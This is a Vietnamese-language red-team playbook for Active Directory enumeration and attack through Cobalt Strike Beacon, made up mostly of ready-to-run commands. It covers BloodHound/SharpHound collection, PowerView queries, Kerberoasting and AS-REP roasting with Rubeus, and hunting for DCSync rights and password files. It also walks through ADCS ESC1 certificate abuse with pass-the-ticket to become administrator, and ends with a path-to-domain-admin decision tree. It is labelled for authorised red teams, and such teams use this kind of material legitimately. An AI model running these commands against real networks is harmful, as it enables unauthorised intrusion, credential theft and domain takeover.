# Cobalt Strike — Liệt Kê Active Directory (Tiếng Việt)

> Hướng dẫn toàn diện về liệt kê môi trường Active Directory qua Cobalt Strike Beacon. Bao gồm thu thập dữ liệu BloodHound, PowerView, truy vấn LDAP, liệt kê trust, và xác định đường dẫn tấn công.

---

## Mục Lục

1. [Chiến Lược Liệt Kê AD](#1-chiến-lược-liệt-kê-ad)
2. [Trinh Sát Domain Cơ Bản](#2-trinh-sát-domain-cơ-bản)
3. [Liệt Kê Người Dùng](#3-liệt-kê-người-dùng)
4. [Liệt Kê Nhóm](#4-liệt-kê-nhóm)
5. [Liệt Kê Máy Tính](#5-liệt-kê-máy-tính)
6. [Liệt Kê GPO & OU](#6-liệt-kê-gpo--ou)
7. [Liệt Kê Trust](#7-liệt-kê-trust)
8. [Liệt Kê ACL](#8-liệt-kê-acl)
9. [Service Principal Names (SPN)](#9-service-principal-names-spn)
10. [Thu Thập Dữ Liệu BloodHound](#10-thu-thập-dữ-liệu-bloodhound)
11. [Tham Khảo Lệnh PowerView](#11-tham-khảo-lệnh-powerview)
12. [Liệt Kê ADCS](#12-liệt-kê-adcs)
13. [Truy Vấn LDAP Trực Tiếp](#13-truy-vấn-ldap-trực-tiếp)
14. [Situational Awareness BOF](#14-situational-awareness-bof)
15. [Xác Định Đường Dẫn Tấn Công](#15-xác-định-đường-dẫn-tấn-công)

---

## 1. Chiến Lược Liệt Kê AD

### Cách Tiếp Cận Ít Ồn Nhất

Ưu tiên công cụ in-memory và LOLBin thay vì file EXE được thả:

```
Ưu tiên 1: Lệnh net của Beacon (tích hợp sẵn, không cần tool thêm)
Ưu tiên 2: PowerView qua powerpick (không có powershell.exe, không drop file)
Ưu tiên 3: execute-assembly (SharpHound, Seatbelt, ADSearch) — .NET in-memory
Ưu tiên 4: Situational Awareness BOF — inline, không fork&run process
Ưu tiên 5: lệnh shell net/nltest — dùng tool hệ thống, hiển thị trong log 4688
```

### Thứ Tự Liệt Kê

```
Thông tin domain → máy tính → người dùng → nhóm → GPO → ACL → trust → SPN → ADCS
```

---

## 2. Trinh Sát Domain Cơ Bản

### Thông Tin Domain

```
beacon> net domain
beacon> net dclist
beacon> net domain_controllers
beacon> net domain_trusts

beacon> shell whoami /all
beacon> shell echo %userdomain%
beacon> shell echo %logonserver%

# Thông tin domain đầy đủ qua nltest
beacon> shell nltest /dsgetdc:%userdomain%
beacon> shell nltest /domain_trusts /all_trusts /v

# SID domain
beacon> powerpick Get-ADDomain | Select-Object Name,DNSRoot,DomainSID,PDCEmulator
```

### Phát Hiện Domain Controller

```
beacon> net dclist
beacon> shell nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local

# Chi tiết hơn qua PowerView:
beacon> powershell-import /opt/tools/PowerView.ps1
beacon> powerpick Get-DomainController | Select-Object Name,IPAddress,Domain,Forest,OSVersion,Roles
```

### Thông Tin Forest

```
beacon> powerpick Get-ForestDomain
beacon> powerpick Get-ForestTrust
beacon> powerpick Get-Forest | Select-Object Name,ForestMode,Domains,GlobalCatalogs
```

---

## 3. Liệt Kê Người Dùng

### Liệt Kê Tất Cả Người Dùng Domain

```
beacon> net users                              # người dùng local
beacon> shell net user /domain                 # tất cả người dùng domain
beacon> powerpick Get-DomainUser | Select-Object SamAccountName,Description,PasswordLastSet,LastLogonDate
```

### Tìm Người Dùng Có Giá Trị Cao

```
# Domain Admins
beacon> net group "Domain Admins"
beacon> powerpick Get-DomainGroupMember "Domain Admins" -Recurse | Select-Object GroupName,MemberName,MemberDomain

# Enterprise Admins
beacon> powerpick Get-DomainGroupMember "Enterprise Admins" -Recurse

# Protected Users (không thể dùng NTLM)
beacon> powerpick Get-DomainGroupMember "Protected Users"

# Tài khoản với AdminCount=1 (được bảo vệ bởi AdminSDHolder)
beacon> powerpick Get-DomainUser -AdminCount | Select-Object SamAccountName,AdminCount
```

### Tìm Người Dùng Không Cần Pre-Auth (AS-REP Roastable)

```
beacon> powerpick Get-DomainUser -UACFilter DONT_REQ_PREAUTH | Select-Object SamAccountName,UserAccountControl
beacon> execute-assembly /opt/tools/Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

### Tìm Người Dùng Đang Đăng Nhập

```
beacon> net logons                             # đăng nhập hiện tại
beacon> net sessions                           # phiên SMB
beacon> shell qwinsta /server:dc01            # phiên terminal
beacon> powerpick Get-NetLoggedon -ComputerName dc01.corp.local
beacon> powerpick Get-NetSession -ComputerName dc01.corp.local
```

### Tìm Nơi Domain Admin Đang Đăng Nhập

```
beacon> powerpick $DAs = (Get-DomainGroupMember "Domain Admins").MemberName; foreach ($computer in (Get-DomainComputer | Select-Object -Expand DNSHostName)) { $sessions = Get-NetSession -ComputerName $computer -ErrorAction SilentlyContinue; foreach ($s in $sessions) { if ($DAs -contains $s.username) { Write-Host "DA $($s.username) đang ở $computer" } } }
```

---

## 4. Liệt Kê Nhóm

### Liệt Kê Tất Cả Nhóm

```
beacon> net groups
beacon> powerpick Get-DomainGroup | Select-Object SamAccountName,Description,GroupScope,GroupCategory
```

### Liệt Kê Thành Viên Nhóm Cụ Thể

```
beacon> net group "Domain Admins"
beacon> net group "Enterprise Admins"
beacon> net group "Backup Operators"         # có thể đọc file backup — tiềm năng NTDS
beacon> net group "Account Operators"        # có thể quản lý người dùng
beacon> net group "Server Operators"         # có thể đăng nhập vào DC
beacon> net group "Print Operators"          # có thể đăng nhập vào DC
beacon> net group "Remote Desktop Users"
beacon> net group "DNS Admins"               # có thể load DLL tùy ý vào DNS service

beacon> net localgroup                       # nhóm local trên máy này
beacon> net localgroup "Administrators"      # admin local
```

---

## 5. Liệt Kê Máy Tính

### Liệt Kê Tất Cả Máy Tính Domain

```
beacon> net computers
beacon> powerpick Get-DomainComputer | Select-Object Name,DNSHostName,OperatingSystem,LastLogonDate | Sort-Object LastLogonDate -Descending
```

### Tìm Server vs. Workstation

```
beacon> powerpick Get-DomainComputer -OperatingSystem "*Server*" | Select-Object Name,OperatingSystem,DNSHostName
beacon> powerpick Get-DomainComputer -OperatingSystem "*Workstation*" | Select-Object Name,OperatingSystem
```

### Tìm Máy Tính Với Unconstrained Delegation

```
beacon> powerpick Get-DomainComputer -Unconstrained | Select-Object Name,ServicePrincipalName
```

> Máy tính unconstrained delegation lưu TGT của bất kỳ người dùng nào xác thực với chúng — mục tiêu hàng đầu để thu thập token.

### Tìm Máy Tính Với Constrained Delegation

```
beacon> powerpick Get-DomainComputer -TrustedToAuth | Select-Object Name,msds-allowedtodelegateto
```

---

## 6. Liệt Kê GPO & OU

### Liệt Kê Tất Cả GPO

```
beacon> powerpick Get-DomainGPO | Select-Object DisplayName,GpcFileSysPath,WhenCreated
```

### Tìm GPO Áp Dụng Cho OU Cụ Thể

```
beacon> powerpick Get-DomainGPO -ComputerName dc01.corp.local
beacon> powerpick Get-DomainOUGPO -Identity "Domain Controllers"
```

### Tìm Nhóm Bị Hạn Chế Trong GPO

```
beacon> powerpick Get-DomainGPOLocalGroup | Select-Object GPODisplayName,GroupName,GroupMemberOf,GroupMembers
```

### Liệt Kê OU

```
beacon> powerpick Get-DomainOU | Select-Object Name,DistinguishedName
beacon> powerpick Get-DomainOU | ForEach-Object { Get-DomainObjectAcl $_.DistinguishedName | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner"} }
```

---

## 7. Liệt Kê Trust

### Liệt Kê Tất Cả Trust

```
beacon> net domain_trusts
beacon> shell nltest /domain_trusts /all_trusts /v

beacon> powerpick Get-DomainTrust | Select-Object SourceName,TargetName,TrustType,TrustDirection,TrustAttributes
beacon> powerpick Get-ForestTrust
```

### Giải Thích Loại Trust

| Loại | Ý nghĩa |
|---|---|
| `WITHIN_FOREST` | Trust giữa các domain trong cùng forest |
| `UPLEVEL` (Kerberos) | Trust dựa trên Kerberos |
| `DOWNLEVEL` (NTLM) | Trust dựa trên NTLM |
| `FOREST_TRANSITIVE` | Trust forest đầy đủ — TGT referral hai chiều |
| `EXTERNAL` | Trust không bắc cầu tới domain bên ngoài |

---

## 8. Liệt Kê ACL

Sai cấu hình ACL thường là đường dẫn di chuyển ngang và leo thang đặc quyền có tác động nhất.

### Tìm Tất Cả Object Mà Người Dùng Hiện Tại Có Quyền Write

```
beacon> powerpick Find-InterestingDomainAcl | Select-Object ObjectDN,ActiveDirectoryRights,SecurityIdentifier,IdentityReferenceName
```

### Các Quyền Thú Vị Cần Tìm

| Quyền | Tác động |
|---|---|
| `GenericAll` | Toàn quyền — thêm vào nhóm, đổi mật khẩu, v.v. |
| `WriteDACL` | Chỉnh sửa DACL — cấp cho mình bất kỳ quyền nào |
| `WriteOwner` | Lấy ownership → rồi WriteDACL |
| `GenericWrite` | Ghi vào thuộc tính cụ thể |
| `ForceChangePassword` | Reset mật khẩu không cần biết mật khẩu hiện tại |
| `AddMember` | Thêm thành viên vào nhóm |
| `AllExtendedRights` | Tất cả extended rights |
| Quyền DCSync | DS-Replication-Get-Changes + DS-Replication-Get-Changes-All |

### Tìm Người Dùng Có Thể DCSync

```
beacon> powerpick (Get-DomainObjectAcl "DC=corp,DC=local" -ResolveGUIDs | Where-Object {$_.ObjectAceType -match "DS-Replication-Get-Changes"}).SecurityIdentifier | ForEach-Object { Get-DomainObject -Identity $_ | Select-Object SamAccountName,DistinguishedName }
```

---

## 9. Service Principal Names (SPN)

### Tìm Người Dùng Có Thể Kerberoast

```
beacon> powerpick Get-DomainUser -SPN | Select-Object SamAccountName,ServicePrincipalName,PasswordLastSet,Description

# Qua Rubeus:
beacon> execute-assembly /opt/tools/Rubeus.exe kerberoast /stats         # chỉ thống kê
beacon> execute-assembly /opt/tools/Rubeus.exe kerberoast /outfile:hashes.txt   # request tất cả
beacon> execute-assembly /opt/tools/Rubeus.exe kerberoast /user:sqlsvc /rc4opsec  # một user cụ thể
```

### Loại Service Phổ Biến

```
MSSQLSvc    — SQL Server (thường chạy dưới service account)
HTTP        — Web service
CIFS        — SMB file share
HOST        — RPC/NetBIOS
WSMAN       — WinRM
```

---

## 10. Thu Thập Dữ Liệu BloodHound

### Thu Thập SharpHound

```
# Thu thập tất cả dữ liệu (ồn nhất — tạo nhiều sự kiện xác thực)
beacon> execute-assembly /opt/tools/SharpHound.exe -c All -d corp.local --zipfilename bh_output.zip

# Thu thập phương thức cụ thể (yên lặng hơn)
beacon> execute-assembly /opt/tools/SharpHound.exe -c DCOnly         # chỉ DC — liệt kê AD objects
beacon> execute-assembly /opt/tools/SharpHound.exe -c Group,User,ObjectProps  # không có computer sessions
beacon> execute-assembly /opt/tools/SharpHound.exe -c ComputerOnly   # dữ liệu local admin/session

# Thu thập ẩn (chậm hơn, ít chính xác hơn)
beacon> execute-assembly /opt/tools/SharpHound.exe -c All --stealth

# Đầu ra vào đường dẫn cụ thể
beacon> execute-assembly /opt/tools/SharpHound.exe -c All --outputdirectory C:\Temp --zipfilename bh.zip
```

### Tải Xuống Output BloodHound

```
beacon> download C:\Temp\bh_output.zip
beacon> rm C:\Temp\bh_output.zip
```

### Truy Vấn BloodHound Chính (Cypher)

Chạy trong BloodHound sau khi import dữ liệu:

```cypher
-- Tìm đường ngắn nhất đến Domain Admins từ user đã owned
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

-- Tìm tất cả user có quyền DCSync
MATCH (u)-[r:GetChanges|GetChangesAll]->(d:Domain) RETURN u,r,d

-- Tìm máy tính unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

-- Tìm máy tính nơi DA đang đăng nhập
MATCH p=(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})-[:MemberOf|HasSession*1..]->(c:Computer) RETURN p

-- Tất cả user có thể Kerberoast
MATCH (u:User) WHERE u.hasspn=true RETURN u
```

---

## 11. Tham Khảo Lệnh PowerView

### Import PowerView

```
beacon> powershell-import /opt/tools/PowerView.ps1
# Sau đó dùng powerpick cho tất cả lệnh PS tiếp theo
```

### Tham Khảo Hàm PowerView Đầy Đủ

```
# Hàm Domain
Get-DomainPolicy                               # chính sách domain và DC
Get-DomainSID                                  # SID domain hiện tại

# Hàm User
Get-DomainUser                                 # tất cả user
Get-DomainUser -Identity jsmith               # user cụ thể
Get-DomainUser -SPN                           # user có SPN
Get-DomainUser -AdminCount                    # AdminSDHolder protected
Get-DomainUser -UACFilter PASSWD_NOTREQD     # không cần mật khẩu
Get-DomainUser -LDAPFilter "(description=*pass*)"  # mô tả chứa "pass"

# Hàm Group
Get-DomainGroup                                # tất cả nhóm
Get-DomainGroup -Identity "Domain Admins"    # nhóm cụ thể
Get-DomainGroupMember "Domain Admins" -Recurse   # thành viên đệ quy
Get-DomainGroup -MemberIdentity jsmith       # nhóm user thuộc về

# Hàm Computer
Get-DomainComputer                             # tất cả máy tính
Get-DomainComputer -OperatingSystem "*Server*"  # lọc theo OS
Get-DomainComputer -Unconstrained             # unconstrained delegation
Get-DomainComputer -TrustedToAuth             # constrained delegation
Get-DomainComputer -Ping                      # chỉ host có thể kết nối

# Hàm GPO
Get-DomainGPO                                  # tất cả GPO
Get-DomainGPOLocalGroup                        # cài đặt nhóm local trong GPO
Get-DomainGPOUserLocalGroupMapping            # ánh xạ user sang local admin qua GPO
Get-DomainOU                                   # tất cả OU

# Hàm Trust
Get-DomainTrust                                # tất cả trust
Get-ForestTrust                                # forest trust
Get-ForestDomain                               # tất cả domain trong forest

# Hàm ACL
Get-DomainObjectAcl "DC=corp,DC=local" -ResolveGUIDs   # ACL object domain
Find-InterestingDomainAcl                     # tìm tất cả ACL thú vị
Add-DomainObjectAcl                            # thêm ACE

# Sửa đổi Object
Set-DomainObject -Identity jsmith -Set @{description="mô tả mới"}
Set-DomainUserPassword -Identity jsmith -AccountPassword (ConvertTo-SecureString "MatKhauMoi123" -AsPlainText -Force)

# Session/Logon
Get-NetLoggedon -ComputerName dc01            # ai đang đăng nhập
Get-NetSession -ComputerName dc01             # phiên SMB
Find-DomainUserLocation                        # tìm nơi user đang đăng nhập (ồn)

# Liệt kê Share
Find-DomainShare                               # tất cả share có thể kết nối
Find-DomainShare -CheckShareAccess            # chỉ share user hiện tại có thể truy cập
Find-InterestingDomainShareFile -Include *.kdbx,*.xlsx,passwords.*,*.config

# Local Admin
Find-LocalAdminAccess                          # tìm host nơi user là local admin
```

---

## 12. Liệt Kê ADCS

### Tìm Certificate Authorities

```
beacon> execute-assembly /opt/tools/Certify.exe cas
```

### Tìm Template Dễ Bị Tổn Thương (ESC1–ESC8)

```
beacon> execute-assembly /opt/tools/Certify.exe find /vulnerable
beacon> execute-assembly /opt/tools/Certify.exe find /enrolleeSuppliesSubject    # ESC1
beacon> execute-assembly /opt/tools/Certify.exe find /clientauth
```

### Đường Dẫn Leo Thang ADCS Phổ Biến

| ESC | Lỗ hổng | Tác động |
|---|---|---|
| ESC1 | CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU | Đăng ký cert với bất kỳ SAN → domain admin |
| ESC2 | Any Purpose hoặc No EKU + đặc quyền enroll quá mức | Cert đa năng |
| ESC3 | Lạm dụng Certificate Request Agent template | Đăng ký thay mặt bất kỳ user nào |
| ESC4 | Quyền ghi trên template | Sửa đổi template → ESC1 |
| ESC6 | Cờ EDITF_ATTRIBUTESUBJECTALTNAME2 trên CA | Request cert với bất kỳ SAN cho bất kỳ template nào |
| ESC8 | Web enrollment + NTLM relay | Relay để lấy cert cho DC |

### Request Certificate Để Leo Thang (ESC1)

```
beacon> execute-assembly /opt/tools/Certify.exe request /ca:ca01.corp.local\corp-CA /template:VulnTemplate /altname:administrator

# Chuyển đổi PEM → PFX (trên máy operator)
# openssl pkcs12 -in cert.pem -keyex -CSP "..." -export -out cert.pfx

# Dùng cert để lấy TGT
beacon> upload cert.pfx
beacon> execute-assembly /opt/tools/Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:certpass /ptt
```

---

## 13. Truy Vấn LDAP Trực Tiếp

```
# Qua ADSearch.exe (execute-assembly)
beacon> execute-assembly /opt/tools/ADSearch.exe --search "(&(objectCategory=user)(adminCount=1))" --attributes samaccountname,description

# Tìm tất cả máy tính
beacon> execute-assembly /opt/tools/ADSearch.exe --search "(objectCategory=computer)" --attributes name,dNSHostName,operatingSystem

# Tìm SPN
beacon> execute-assembly /opt/tools/ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes sAMAccountName,servicePrincipalName
```

### Bộ Lọc LDAP Phổ Biến

```
# Tất cả user với password không hết hạn
(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))

# Tất cả user bị vô hiệu hóa
(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2))

# Tất cả user không cần pre-auth
(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

# Tất cả nhóm có tên chứa "admin"
(&(objectCategory=group)(cn=*admin*))
```

---

## 14. Situational Awareness BOF

BOF cho liệt kê AD chạy inline không cần fork&run:

```
beacon> inline-execute /opt/bofs/whoami.o
beacon> inline-execute /opt/bofs/nslookup.o dc01.corp.local
beacon> inline-execute /opt/bofs/netstat.o
beacon> inline-execute /opt/bofs/netview.o
beacon> inline-execute /opt/bofs/schtasksList.o
beacon> inline-execute /opt/bofs/reg.o query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Bộ sưu tập BOF cộng đồng: `trustedsec/CS-Situational-Awareness-BOF`

---

## 15. Xác Định Đường Dẫn Tấn Công

### Cây Quyết Định Tóm Tắt

```
Vị trí Hiện Tại (user domain đặc quyền thấp)
    │
    ├─ Kiểm tra tư cách thành viên nhóm → nhóm thú vị nào?
    │       ↓
    │   Tìm quyền local admin → Find-LocalAdminAccess
    │       ↓
    │   Di chuyển tới đó → inject/dump → token đặc quyền cao hơn
    │
    ├─ Kiểm tra ACL → GenericAll/WriteDACL trên object có giá trị cao?
    │       ↓
    │   Lạm dụng ACL → reset mật khẩu / thêm nhóm / cấp DCSync
    │
    ├─ Kerberoast → hash service account nào có thể crack?
    │       ↓
    │   Crack offline → lấy thông tin xác thực service account
    │
    ├─ AS-REP roast → user DONT_REQ_PREAUTH nào?
    │
    ├─ Host unconstrained delegation → ép DC xác thực → lấy trộm TGT
    │
    ├─ Constrained delegation → S4U2Self → S4U2Proxy
    │
    ├─ Template ADCS dễ bị tổn thương → ESC1–ESC8 → xác thực bằng cert
    │
    └─ Trust hopping → nếu có forest trust, tìm đường xuyên forest
```

### Tìm Đường Dẫn Với BloodHound

Sau khi import dữ liệu SharpHound:

```
1. Đánh dấu user hiện tại là "Owned"
2. Chạy: "Find Shortest Paths to Domain Admins"
3. Chạy: "Find Principals with DCSync Rights"
4. Chạy: "List All Kerberoastable Accounts"
5. Chạy: "Find Computers with Unconstrained Delegation"
6. Chạy: "Shortest Paths to Unconstrained Delegation Systems"
```

---

*Cập nhật lần cuối: 2026-06-09 | Tài liệu tham khảo chỉ dành cho red team được ủy quyền.*
